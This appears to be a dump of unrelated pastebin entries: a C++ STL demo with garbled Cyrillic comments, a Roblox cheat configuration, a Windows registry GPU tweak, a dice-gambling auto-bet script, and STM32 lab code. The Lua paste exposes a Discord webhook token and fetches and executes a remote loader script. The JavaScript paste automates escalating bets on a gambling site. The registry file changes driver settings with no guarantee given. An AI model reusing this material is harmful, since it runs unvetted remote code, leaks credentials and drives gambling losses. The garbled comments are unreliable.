    // —É–¥–∞–ª—è–µ—Ç —ç–ª–µ–º–µ–Ω—Ç (–ø—Ä–∏ –Ω–∞–ª–∏—á–∏–∏) –ø—É—Ç–µ–º —Å–¥–≤–∏–≥–∞ –≤—Å–µ—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤ —Å–ø—Ä–∞–≤–∞ –æ—Ç –Ω–µ–≥–æ –Ω–∞ –æ–¥–Ω—É –ø–æ–∑–∏—Ü–∏—é –ª–µ–≤–µ–µ –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∏—Ç–µ—Ä–∞—Ç–æ—Ä –Ω–∞ –Ω–æ–≤—ã–π –∫–æ–Ω–µ—Ü –≤–µ–∫—Ç–æ—Ä–∞
    it = std::remove(numbers.begin(), numbers.end(), 74);

    // —É–¥–∞–ª—è–µ–º —ç–ª–µ–º–µ–Ω—Ç –ø–æ –∏—Ç–µ—Ä–∞—Ç–æ—Ä—É, –∫–æ—Ç–æ—Ä—ã–π –≤–µ—Ä–Ω—É–ª–∞ —Ñ—É–Ω–∫—Ü–∏—è remove
    numbers.erase(it);

    print(numbers);

    // —É–¥–∞–ª—è–µ–º –≤ –≤–µ–∫—Ç–æ—Ä–µ –≤—Å–µ —ç–ª–µ–º–µ–Ω—Ç—ã, —É–¥–æ–≤–ª–µ—Ç–≤–æ—Ä—è—é—â–∏–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–º—É —É—Å–ª–æ–≤–∏—é
    it = remove_if(numbers.begin(), numbers.end(), [](int a) {return a > 20 && a < 30; });

    // —É–¥–∞–ª—è–µ–º –ª–∏—à–Ω–∏–π –¥–∏–∞–ø–∞–∑–æ–Ω
    numbers.erase(it, numbers.end());

    print(numbers);


    // –∑–∞–º–µ–Ω–∞ –≤—Å–µ—Ö –∑–Ω–∞—á–µ–Ω–∏–π –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ —Ä–∞–≤–Ω—ã—Ö 81 –Ω–∞ 83
    std::replace(numbers.begin(), numbers.end(), 81, 83);

    print(numbers);

    // –∑–∞–º–µ–Ω–∞ —ç–ª–µ–º–µ–Ω—Ç–æ–≤, —É–¥–æ–≤–ª–µ—Ç–≤–æ—Ä—è—é—â–∏—Ö –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–º—É —É—Å–ª–æ–≤–∏—é
    std::replace_if(numbers.begin(), numbers.end(), [](int a) { return a < 20; }, 1);

    print(numbers);


    // —É–¥–∞–ª—è–µ—Ç –¥—É–±–ª–∏, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∏—Ç–µ—Ä–∞—Ç–æ—Ä –Ω–∞ –Ω–æ–≤—ã–π –∫–æ–Ω–µ—Ü –≤–µ–∫—Ç–æ—Ä–∞
    it = std::unique(numbers.begin(), numbers.end());

    numbers.erase(it, numbers.end());

    print(numbers);


    // –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∏—Ç–µ—Ä–∞—Ç–æ—Ä –Ω–∞ –ø–µ—Ä–≤—ã–π —ç–ª–µ–º–µ–Ω—Ç, –±–æ–ª—å—à–∏–π –∏–ª–∏ —Ä–∞–≤–Ω—ã–π —É–∫–∞–∑–∞–Ω–Ω–æ–º—É
    it = std::lower_bound(numbers.begin(), numbers.end(), 50);

    if (it != numbers.end()) {
        std::cout << *it << std::endl;
    }

    // –≤—ã–ø–æ–ª–Ω—è–µ—Ç —É–∫–∞–∑–∞–Ω–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ –¥–ª—è –≤—Å–µ—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –∏–∑ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –¥–∏–∞–ø–∞–∑–æ–Ω–µ
    std::for_each(numbers.begin(), it, [](int& a) { a *= 2; });

    print(numbers);
}
"
iDSHSfJC,Lp Dvi,suramraja1,Lua,Friday 24th of May 2024 04:48:03 AM CDT,"_G.key = ""6609522098494672ad6f457286fe9b5c""
 
getgenv().Config = {
    [""AutoVoteDifficulty""] = false,
    [""RequiredGem""] = 2500,
    [""SellRarities""] = {
        [""Legendary""] = false,
        [""Basic""] = false,
        [""Epic""] = false,
        [""Uncommon""] = false,
        [""Rare""] = false
    },
    [""DelayReplay""] = 10,
    [""ExchangeTier""] = 4,
    [""WH_MatchComplete""] = true,
    [""AutoSkip""] = true,
    [""AutoClaimQuest""] = true,
    [""TPLobbyIfPlayer""] = true,
    [""WH_MailSent""] = true,
    [""Summon10""] = true,
    [""SelectMacro""] = ""Dumboy"",
    [""PlaceFailsafe""] = true,
    [""AutoJoinEndless""] = false,
    [""PlayMacro""] = true,
    [""AutoMail""] = true,
    [""AutoUseBoost""] = true,
    [""AutoSummonTroop""] = false,
    [""AutoReplay""] = true,
    [""SellWave""] = 1,
    [""AutoClaimEventPass""] = true,
    [""AutoExchange""] = true,
    [""RequireRoll""] = 0,
    [""AutoJoinMatch""] = true,
    [""AutoSellOW""] = false,
    [""BlackScreen""] = false,
    [""SelectCase""] = ""BasicCrate"",
    [""MailName""] = ""PixyPalx"",
    [""AutoClaimVIP""] = false,
    [""UseAll""] = false,
    [""AutoSave""] = true,
    [""JoinFailsafe""] = true,
    [""AutoClaimEventQuest""] = true,
    [""DeleteMap""] = true,
    [""WebhookURL""] = ""https://discord.com/api/webhooks/1241827013203853434/nuoNqTEXIh3IYNCWjoZ6DJwCe246EcX1EXKrhtYrumTtXyd9oUl_xXU9yndoFTzYJX75"",
    [""AutoRejoin""] = true,
    [""SelectMap""] = ""TimeFactory (Rewind)"",
    [""DelayJoin""] = 8,
    [""IgnoreMacroTiming""] = true,
    [""UseBoosts""] = {
        [""2xEggsBoost""] = false,
        [""2xXPBoost_Easter2024""] = false,
        [""2xCloversBoost""] = false,
        [""2xEventXPBoost""] = false,
        [""Weekend_2xEndlessXPBoost""] = false,
        [""2xLuckBoost""] = false,
        [""2xXPBoost""] = false,
        [""2xCoinsBoost""] = false,
        [""Weekend_2xCoinsBoost""] = false,
        [""2xClocksBoost""] = true
    },
    [""BoostFPS""] = true
}
 
loadstring(game:HttpGet(""https://nousigi.com/loader.lua""))() 
 
coroutine.wrap(function()
    pcall(function()
        task.wait(60)
        game:GetService(""CoreGui"").Codex.gui.Enabled = false
        task.wait(1)
        game:service'VirtualInputManager':SendKeyEvent(true, ""Tab"", false, game)
    end)
end)()"
sarDnJQN,Enable HAGS for the 6000 series.reg,neil_tohno,REG,Friday 24th of May 2024 04:26:58 AM CDT,"Windows Registry Editor Version 5.00

;No guaranteed.
;original post, https://forums.guru3d.com/threads/.450111/page-2#post-6184603

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000]
""KMD_EnableMSHWS""=dword:00000002
""HwSchMode""=dword:00000002
""Proxy_EnableMsHws""=dword:00000001
""Proxy_EnableMsHwsForLda""=dword:00000001

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\UMD]
""HwSchMode""=hex:32,00
""Proxy_EnableMsHws""=hex:31,00
""Proxy_EnableMsHwsForLda""=hex:31,00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\VolatileSettings]
""KMDMSHWS""=hex:00,74,00,77,00,65,00,61,00,6b,00,24,36,48,64,72,00,70,00,72,00,\
  6f,00,76,00,69,00,64,00,65,00,64,00,62,00,79,00,25,50,75,00,61,00,6d,00,65,\
  00,72,00,6e,00,69,00,6d,00,65,00,7a,00,6f,00,6e,00,65,00,28,00,74,00,6d,00,\
  29

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000]
""GPU Hardware Scheduling Service Mode""=""HWSCH DRIVER ENABLED""
"
jhdciTi7,snowybot 2024 private  released,coinwalk,JavaScript,Friday 24th of May 2024 04:23:12 AM CDT,"var OriginalBalanCe = parseFloat(document.getElementById('pct_balance').value);
var BaseBet = Number((OriginalBalanCe/240).toFixed(8))
var NexTBet = BaseBet;
var tens = (BaseBet*10);
var fives = (BaseBet*4.9);
var sevens = (BaseBet*6.9);
var eights = (BaseBet*7.9);
var winnerdinner = (OriginalBalanCe*24);
var snowzy = ((Math.floor(OriginalBalanCe/tens))*tens);
var loL = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowy = 0;
var BalanCe = OriginalBalanCe;
 
function go(){
BalanCe = document.getElementById('pct_balance').value;
var dog = Number((BalanCe-OriginalBalanCe).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((BalanCe>(((Math.floor(BalanCe/tens))*tens)+sevens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+eights))&&(BalanCe!=snowy)){
    NexTBet = NexTBet*2;
    snowy = parseFloat(BalanCe);
}
if ((BalanCe<(snowzy-tens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))){
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if (((BalanCe/40)<=NexTBet)&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){ 
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe>(loL+tens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){ 
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
    loL = ((Math.floor(BalanCe/tens))*tens);
}
if (BalanCe>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((NexTBet*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 112);
}
go();"
kWR7Zxit,marfa_v2,Bobita,C,Friday 24th of May 2024 04:22:22 AM CDT,"/*
 * USART2 is connected to the ST-Link virtual COM port.
 * Use Tera Term to interract with STM board
 *
 * By default, the clock is running at 16 MHz.
 * The UART2 is configured for 115200 Baud.
 * PA2 - USART2 TX (AF7)
 * PA3 - USART2 RX (AF7)
 */
#include ""stm32f4xx.h""
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <stdlib.h>
#include ""Types.h""
#include ""Drivers.h""

void delayMs(int);
UART_MSG_T msg = {.data = {0}, .id = 0, .len = 0};
U8 CyclicMessage_U8 = 0;
U8 TimerCountDown_U16 = SECONDS_TO_COUNT_U8;
U8 PrintInCycleMode_U8 = 0;

/* Lucrarea 2 de completat */

void PeriphInit(void)
{

	__disable_irq();
	// Configure PB[7..4] as output
	RCC->AHB1ENR |= 0;			 /* Enable GPIOB clock */
	GPIOB->MODER &= 0; /* Reset GPIOB PB[7..4]  */
	GPIOB->MODER |= 0;	 /* Set GPIOB PB[7..4]  as ouput */

	// Configure PC[11..8] as input
	RCC->AHB1ENR |= 0;			 /* Enable GPIOC clock */
	GPIOC->MODER &= 0; /* Reset GPIOC PC[11..8]  for input mode */

	// Configure PB[15..12] port as input and enables pull-ups
	GPIOB->MODER &= 0; /* Reset GPIOB PB[15..12]  */
	GPIOB->PUPDR |= 0;	 /* Enable pull-ups on GPIOB PB[15..12]  */

	USART2_init();

	__enable_irq();
}

/* TODO: change the 0's to the correct value */
const U8 Hex7Segment[16] = {0};

/* end lucrarea 2*/

/* Lucrarea 3 De completat*/
static const U32 STRVR = 0;
static const U16 STCTRL = 0;

static const U16 TIM3_PSC = 0;
static const U16 TIM3_ARR = 0;

static const U16 TIM3_CH1_PSC = 0;
static const U16 TIM3_CH1_ARR = 0; 
static const U16 TIM3_CH1_CCMR1 = 0;
static const U16 TIM3_CH1_CCR1 = 0;

static const U16 TIM8_CH3_PSC = 0; 
static const U16 TIM8_CH3_CCMR2 = 0;

U32 timestamp = 0;
U32 capture_time = 0;
U8 nr_of_pushes = 0;
U8 factor = 1;
/* end lucrarea  3 */

/* Lucrarea 4 */

U16 dac_factor = 600;
U16 dac_hold_value = 0;


#define ADC_8_BIT 1 //dezactivati pentru adc 12 biti

#if ADC_8_BIT
static const U32 ADC_CR1 = 0; /* 8-bit resolution */
static const U32 ADC_CR2 = 0; /* SW Start, Align right justified, start adc */
#else 
static const U32 ADC_CR1 = 0; /* 12-bit resolution */
static const U32 ADC_CR2 = 0; /* SW Start, Align left justified,  start ADC */
#endif

static const U32 MODER = 0; /* PA0-PA4 ca intrari analogice*/

/*End of Lucrarea 4*/

/* lucrarea 5 */
static const U32 MODER_IRQ_B = 0; /* PB15-PB12 ca intrari*/
static const U32 MODER_IRQ_C = 0; /* PC11-PC8 ca intrari */
static const U32 PUPDR_IRQ_B = 0; /* PB15-PB12 pull-up*/
static const U16 EXTI_FTSR = 0; /* ISR on PB15-PB12 falling edge*/
static const U16 EXTI_RTSR = 0; /* ISR on PC11-PC8 rising edge*/

void IRQInit()
{
	SetupIOInterrupt(MODER_IRQ_B, MODER_IRQ_C, PUPDR_IRQ_B, EXTI_FTSR, EXTI_RTSR);
}
/* end of lucrarea 5 */

/* Lucrarea 6 */
static const U16 SPI_CR1 = 0x33C; /* viteza transfer si 8 biti date, master mode */

static const U32 GPIOB_OTYPER = ~0x00000300; /* set as open drain */
static const U32 GPIOB_PUPDR = ~0x00050000;	/* setup SCL, SDA ca pull-up pentru I2C*/
static const U16 I2C_CR1 = 0x8000;			/* SW resetm ie;ire reset, enable I2C1*/
static const U16 I2CC_CCR = 80;				/* setup as standard mode*/
/* end Lucrarea 6 */

U8 ReceiveMessage(void)
{
	char msg_str[MAX_PACKET_STR_SIZE];
	const char *pos = msg_str;

	memset(&msg, 0, sizeof(UART_MSG_T));

	fgets(msg_str, MAX_PACKET_STR_SIZE, stdin);

	if (strlen(msg_str) < 3)
	{
		msg.id = 0xFF;
		return 0;
	}

	if (sscanf(pos, ""%2hhx"", &msg.id) == 0)
	{
		msg.id = 0xFF;
		return 0;
	}

	if (strlen(msg_str) > 5)
	{
		pos += 3;

		for (int i = 1; i < strlen(msg_str) / 3; i++)
		{
			sscanf(pos, ""%2hhx"", &msg.data[i - 1]);
			pos += 3;
			msg.len++;
		}
	}
	return 1;
}

void PrintReceivedMessage(const UART_MSG_T msg)
{
	printf(""the received packet is: \n"");
	printf(""ID: %02x \n"", msg.id);
	printf(""Size in Bytes: %d\n"", msg.len);
	printf(""Data:"");
	for (int i = 0; i < msg.len; i++)
		printf(""%02X "", msg.data[i]);
	printf(""\r\n"");
}

void ProcessMessage(const UART_MSG_T msg)
{
	U32 p;
	switch (msg.id)
	{
	case SW_VERSION:
		printf(""SW Version: 01.03.24-SI\n"");
		break;

	case PORT_INPUT:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] != 0x42 && msg.data[0] != 0x43)
		{
			printf(""bad-port\n"");
		}
		else if (((msg.data[0] == 0x42) && (msg.data[1] > 15 || msg.data[1] < 12)) ||
				 ((msg.data[0] == 0x43) && (msg.data[1] > 11 || msg.data[1] < 8)))
		{
			printf(""bad-pin\n"");
		}
		else
		{
			U32 i = 1;
			p = msg.data[0] != 0x42 ? GPIOC->IDR : GPIOB->IDR;
			i <<= msg.data[1];
			if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
			{
				printf(""%ld \n"", (p & i) >> msg.data[1]);
				PrintInCycleMode_U8 = 0;
			}

			if (CyclicMessage_U8 == 0 && msg.len >= 3)
			{
				if (msg.data[2] > 0)
				{
					CyclicMessage_U8 = 1;
					InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
				}
			}
		}

		break;
	case PORT_OUTPUT:
		if (msg.len < 3)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] != 0x42)
		{
			printf(""bad-port\n"");
		}
		else if ((msg.data[1] > 7) || (msg.data[1] < 4))
		{
			printf(""bad-pin\n"");
		}
		else
		{
			U32 i = 1;
			i <<= msg.data[1];
			GPIOB->BSRR = msg.data[2] ? (GPIOB->BSRR | i) : (GPIOB->BSRR | (i << 16));
			printf(""%02lX\n"", (GPIOB->ODR & 0x000000F0) >> 4);
		}
		break;
	case PORT_HEX:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] > 3)
		{
			printf(""bad-display\n"");
		}
		else if (msg.data[1] > 15)
		{
			printf(""bad-number\n"");
		}
		else
		{

			SPI1_init();
			SPI1_write(Hex7Segment[msg.data[1]]); /* write pattern to the seven segments */
			SPI1_write(1 << msg.data[0]);		  /* select digit */
		}
		break;
	case TIMERS:
		if (msg.len < 1)
		{
			printf(""bad-len\n"");
		}
		else
		{
			SystemTickTimerStop();
			switch (msg.data[0])
			{
			/*general timer */
			case GENERAL_TIM3:
				if (CyclicMessage_U8 == 0)
				{
					TIM3_Cfg(TIM3_PSC, TIM3_ARR);
					timestamp = 0;

					if (msg.len > 1)
					{
						TIM3->ARR = ((TIM3->ARR + 1) * msg.data[1]) - 1;
						factor = msg.data[1];
					}
				}
				if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
				{
					printf(""%ld \n"", timestamp);
					PrintInCycleMode_U8 = 0;
				}

				if (CyclicMessage_U8 == 0 && msg.len >= 3)
				{
					if (msg.data[2] > 0)
					{
						CyclicMessage_U8 = 1;
						InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
					}
					else
					{
						TIM3_Stop();
					}
				}
				break;
			/* out compare */
			case TIM3_CH1_COMPARE:
				TIM3_CH1_Compare_Cfg(TIM3_CH1_PSC, TIM3_CH1_ARR, TIM3_CH1_CCMR1, TIM3_CH1_CCR1);
				if (msg.len > 1)
				{
					TIM3->ARR = TIM3->ARR * msg.data[1];
				}
				break;
			/* in capture */
			case TIM8_CH3_CAPTURE:
				if (CyclicMessage_U8 == 0)
				{
					TIM8_CH3_Capture_Cfg(TIM8_CH3_PSC, TIM8_CH3_CCMR2);
					capture_time = 0;
				}

				if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
				{
					printf(""%d %ld \n"", nr_of_pushes, capture_time);
					PrintInCycleMode_U8 = 0;
				}

				if (CyclicMessage_U8 == 0 && msg.len >= 2)
				{
					if (msg.data[1] > 0)
					{
						CyclicMessage_U8 = 1;
						InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
					}
					else
					{
						TIM8_Stop();
					}
				}
				break;
			/* PWM */
			case TIM8_CH1_PWM:
				StopTIM8_CH1_PWM();
				InitTIM8_CH1_PWM();
				if (msg.len >= 2)
				{
					if (msg.data[1] <= 0x64)
					{
						SetTIM8_CH1_PWM_DutyCycle(msg.data[1]);
					}
					else
					{
						printf(""bad-duty-cycle\n"");
						StopTIM8_CH1_PWM();
					}
				}
				break;
			case SYS_TICK_TIMER:
				SystemTickTimerInit(STRVR, STCTRL);
				break;
			default:
				printf(""Invalid CMD received \n"");
				break;
			}
		}
		break;
	case ADC_DAC:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] == 0x00) /*ADC*/
		{
			if (msg.data[1] > MAX_NR_OF_CHANNELS)
			{
				printf(""bad-channel\n"");
			}
			else if (msg.data[1] < 2 || (msg.data[1] > 3 && msg.data[1] <5) || msg.data[1] > 16)
			{
				U16 adc_value = 0xFFFF;
				ADC_Configure(MODER, ADC_CR1, ADC_CR2);

				adc_value = ADC_SampleChannel(msg.data[1]);
#if ADC_8_BIT
				adc_value &= 0x00FF;
#else
				adc_value &= 0xFFF0;
#endif
				printf(""Channel %d value %d\n"", msg.data[1], adc_value);
				ADC_Stop();
			}
			else
			{
				printf(""Channel %d value %d\n"", msg.data[1], 0xFFFF);
			}
		}
		else if (msg.data[0] == 0x01) /*DAC*/
		{
			if (CyclicMessage_U8 == 0)
			{
				dac_factor = dac_factor * msg.data[1];
				DAC_Configure(dac_hold_value + dac_factor);
			}

			if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
			{

				dac_hold_value = dac_hold_value + dac_factor;
				DAC->DHR12R1 = dac_hold_value & 0x0FFF;

				printf(""Hold Value: %ld \n"", DAC->DHR12R1);
				PrintInCycleMode_U8 = 0;
			}

			if (CyclicMessage_U8 == 0)
			{
				CyclicMessage_U8 = 1;
				InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
			}
		}
		else
		{
			printf(""Invalid module\n"");
		}
		break;
	case IRQ:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] != 0x42 && msg.data[0] != 0x43)
		{
			printf(""bad-port\n"");
		}
		else if (((msg.data[0] == 0x42) && (msg.data[1] > 15 || msg.data[1] < 12)) ||
				 ((msg.data[0] == 0x43) && (msg.data[1] > 11 || msg.data[1] < 8)))
		{
			printf(""bad-pin\n"");
		}
		else
		{

			EnableIRQForIO(msg.data[1]);
			printf(""Press the button for port %c, pin %d\n"", msg.data[0], msg.data[1]);
			delayMs(5000);
			DisableIRQForIO(msg.data[1]);
		}
		break;
	case SPI:
		if (msg.len < 1)
		{
			printf(""bad-len\n"");
		}
		else
		{
			LCD_data(msg.data[0]);
		}
		break;
	case I2C:
		if (msg.len < 1)
		{
			printf(""bad-len\n"");
		}
		else
		{
			I16 acc_g[6];
			I2C1_Init(GPIOB_OTYPER, GPIOB_PUPDR, I2C_CR1, I2CC_CCR);
			MPU6050_initialize();
			MPU6050_getMotion6(&acc_g[0], &acc_g[1], &acc_g[2], &acc_g[3], &acc_g[4], &acc_g[5]);
			if(msg.data[0] > 6)
				printf(""sensor return values: %d, %d, %d, %d, %d, %d\n"", acc_g[0], acc_g[1], acc_g[2], acc_g[3], acc_g[4], acc_g[5]);
			else
				printf(""sensor return value: %d\n"", acc_g[msg.data[0]]);
		}
		break;
	default:
		printf(""Invalid ID received \n"");
		break;
	}
}

	void send_str(char *str)
		{
		int i=0;
		while(str[i]!='\0')	
		{
			LCD_data(str[i]);
			i++;
		}
	}
/*
 * Scan keypad and write the keycode to LEDs.
 * The matrix keypad of the EduBase board is connected to
 * col 0 - PB12
 * col 1 - PB13
 * col 2 - PB14
 * col 3 - PB15
 * row 0 - PC8
 * row 1 - PC9
 * row 2 - PC10
 * row 3 - PC11
 *
 * The four LEDs are connected to
 * LED3 - PB7
 * LED2 - PB6
 * LED1 - PB5
 * LED0 - PB4
 */

#include ""STM32F4XX.h""

void delay(void);
void keypad_init(void);
char keypad_getkey(void);
void writeLEDs(char n);
int readRows(void);
void outputEnableCols(char n);
void writeCols(char n);

/* use bit 3-0 of parameter n to turn on/off LEDs 
void writeLEDs(char n) {
    GPIOB->BSRR = 0x00F00000;   // turn off all LEDs
    GPIOB->BSRR = n << 4;       // turn on LEDs
}
*/
/* system clock at 16 MHz delay about 100 us */
void delay(void) {
	int j;

	for (j = 0; j < 300; j++)
		;      /* do nothing */
}

/* This function intializes the pins connected to the keypad. */
void keypad_init(void) {
	/* make rows input first */
    RCC->AHB1ENR |=  4;             /* enable GPIOC clock */
    GPIOC->MODER &= ~0x00FF0000;    /* clear pin mode */

	/* make columns input */
    RCC->AHB1ENR |=  2;             /* enable GPIOB clock */
    GPIOB->MODER &= ~0xFF000000;    /* clear pin mode */
}

/*
 * This is a non-blocking function to read the keypad.
 * If a key is pressed, it returns a keycode. Otherwise, a zero
 * is returned.
 * The keypad is arranged as a 4x4 matrix. There are pull-down
 * resistors for all pins of the rows on the EduBase board.
 * When no keys are pressed, these pins are low.
 * The columns used as output that can be driven high.
 * First all columns are driven high and the row pins are read. If no
 * keys are pressed, it reads a zero.  Otherwise, some key is pressed.
 * If any key is pressed, the program drives one column high at a time and
 * leave the rest of the columns inactive (float) then read the input (row) pins.
 * Knowing which column is active and which row is active, the program
 * can decide which key is pressed.
 */

char keypad_getkey(void)
{
    int row, col;

    /* check to see any key is pressed first */
    outputEnableCols(0xF);      /* enable all columns */
    writeCols(0xF);             /* and drive them high */
    delay();                    /* wait for signal to settle */
    row = readRows();           /* read all rows */
    writeCols(0x0);             /* discharge all columns */
    outputEnableCols(0x0);      /* disable all columns */
    if (row == 0) return 0;     /* if no key pressed, return a zero */

    /* If a key is pressed, it gets here to find out which key.
     * It activates one column at a time and read the rows to see
     * which is active.
     */
    for (col = 0; col < 4; col++) {
        outputEnableCols(1 << col); /* enable one column */
        writeCols(1 << col);        /* turn the active row high */
        delay();                    /* wait for signal to settle */
        row = readRows();           /* read all rows */
        writeCols(0x0);             /* discharge all columns */
        if (row != 0) break;        /* if one of the row is low, some key is pressed. */
    }

    outputEnableCols(0x0);          /* disable all columns */
    if (col == 4)
        return 0;                   /* if we get here, no key is pressed */

    /* gets here when one of the rows has key pressed.
     * generate a unique key code and return it.
     */
    if (row == 0x01) { return 0 + col;}
    if (row == 0x02) { return 4 + col;}
    if (row == 0x04) { return 8 + col;}
    if (row == 0x08) { return 12 + col;} // key in row 3

    return 0;   /* just to be safe */
}

/* enable columns according to bit 3-0 of the parameter n */
void outputEnableCols(char n) {
    GPIOB->MODER &= ~0xFF000000;    /* clear pin mode */

    /* make the pin output according to n */
	if (n & 1)
		GPIOB->MODER |=  0x01000000;
    if (n & 2)
		GPIOB->MODER |=  0x04000000;
	if (n & 4)
		GPIOB->MODER |=  0x10000000;
	if (n & 1 << 3)
		GPIOB->MODER |=  0x40000000;
}

/* write columns high or low according to bit 3-0 of the parameter n */
void writeCols(char n) {
    GPIOB->BSRR = 0xF0000000;   // turn off all column pins
    GPIOB->BSRR = n << 12;      // turn on column pins
}

/* read rows and return them in bit 3-0 */
int readRows(void) {
	return (GPIOC->IDR & 0x0F00) >> 8;
}
int main(void)
{

 int b2[4]={2,3,7,1};
	int i=0,tries=3;
 int cont=0;
	U8 status = 0;

	PeriphInit();
	if(SPI_CR1 != 0) {
	   LCD_init(SPI_CR1);
	}
	IRQInit();
 char key;

    /* initialize pins connected to keypad */
    keypad_init();

    /* initialize LEDs for display */
    RCC->AHB1ENR |=  2;             /* enable GPIOB clock */
    GPIOB->MODER &= ~0x0000ff00;    /* clear pin mode */
    GPIOB->MODER |=  0x00005500;    /* set pins to output mode */

 
	printf(""Lucrarea 6 interfete seriale \n"");
	printf(""please enter the packet in the following format ID Byte0 Byte1 ... Byte7 \n"");
while(1)
{
	char st[100];
	char *s = ""LOCKED""; 
sprintf(st,""%s"",s);
		send_str(st);
//while(tries!=0)
//{
	GPIOB->BSRR = 0x00F00000;
	while(i<4)
	{
	while((key = keypad_getkey()) == 0);
	
		if(key != b2[i])
		{
			 
		}
		else
		{
			cont++;
		}
		i++;
		while(keypad_getkey() != 0);
	}
		
if(cont == 4)
{
LCD_command(0x01);
	s = ""UNLOCKED"";

	sprintf(st,""%s"",s);
		send_str(st);
}
else
{
	GPIOB->BSRR = ~0x00F00000;
}
		
		if (TimerCountDown_U16 == 0)
		{
			CyclicMessage_U8 = 0;
			TimerCountDown_U16 = (U16)2 * SECONDS_TO_COUNT_U8;
			StopPeriodicTimer();
			TIM3_Stop();
			TIM8_Stop();
			DAC_Stop();
			printf(""please enter the packet in the following format ID Byte0 Byte1 ... Byte7 \n"");
		}

		if (CyclicMessage_U8 != 1)
		{
			status = ReceiveMessage();
		}

		if (status)
		{
			if (CyclicMessage_U8 != 1)
				PrintReceivedMessage(msg);
			ProcessMessage(msg);
			if (CyclicMessage_U8 != 1)
				printf(""please enter the packet in the following format ID Byte0 Byte1 ... Byte7 \n"");
			delayMs(10);
		}
		else
		{
			printf(""Wrong message format \n"");
		}
	}
}
/* ISRs */
void TIM2_IRQHandler(void)
{
	TIM2->SR = 0; /* clear UIF */
	TimerCountDown_U16--;
	PrintInCycleMode_U8 = 1; /* time to print */
}

/* Lucrarea 3*/
void TIM3_IRQHandler(void)
{
	if (TIM3->SR & 1)
	{
		TIM3->SR &= ~1;
		timestamp += 40 * factor;
	}
}

void TIM8_CC_IRQHandler(void)
{
	if (TIM8->SR & 8)
	{
		TIM8->SR &= ~8;
		nr_of_pushes += 1;
		capture_time += TIM8->CCR3;
	}
}

void SysTick_Handler(void)
{
	GPIOB->ODR ^= 0x00000020;
}

/* Lucrarea 5 */
void EXTI15_10_IRQHandler(void)
{
	if (EXTI->PR & 0x00000400)
	{						   /* isr on pin 10 */
		EXTI->PR = 0x00000400; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000040;
	}
	else if (EXTI->PR & 0x00000800)
	{						   /* isr on pin 11 */
		EXTI->PR = 0x00000800; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000080;
	}
	else if (EXTI->PR & 0x00001000)
	{						   /* isr on pin 12 */
		EXTI->PR = 0x00001000; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000010;
	}
	else if (EXTI->PR & 0x00002000)
	{						   /* isr on pin 13 */
		EXTI->PR = 0x00002000; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000020;
	}
	else if (EXTI->PR & 0x00004000)
	{						   /* isr on pin 14 */
		EXTI->PR = 0x00004000; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000040;
	}
	else if (EXTI->PR & 0x00008000)
	{						   /* isr on pin 15 */
		EXTI->PR = 0x00008000; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000080;
	}
}

void EXTI9_5_IRQHandler(void)
{
	if (EXTI->PR & 0x000000100)
	{						   /* isr on pin 8 */
		EXTI->PR = 0x00000100; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000010;
	}
	else if (EXTI->PR & 0x00000200)
	{						   /* isr on pin 9 */
		EXTI->PR = 0x00000200; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000020;
	}
}"
